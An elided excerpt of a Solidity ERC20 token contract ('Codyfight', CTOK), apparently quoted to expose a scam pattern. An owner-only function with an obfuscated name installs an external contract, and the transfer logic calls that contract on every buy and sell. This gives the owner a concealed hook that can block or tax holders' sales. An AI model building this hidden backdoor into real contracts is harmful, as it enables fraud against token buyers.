...
contract TokenM is ERC20 {
    ...
    IUserAmountuvresn public uvresn;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Codyfight", "CTOK") {
    ...
    function corehuenBsengsRinge(IUserAmountuvresn _uvresn) public onlyOwner {
        uvresn = _uvresn;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                uvresn.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				uvresn.addOutAmount(from, amount);
            }else{
                uvresn.addOutAmount(from, amount);
                takeFee = false;
            }
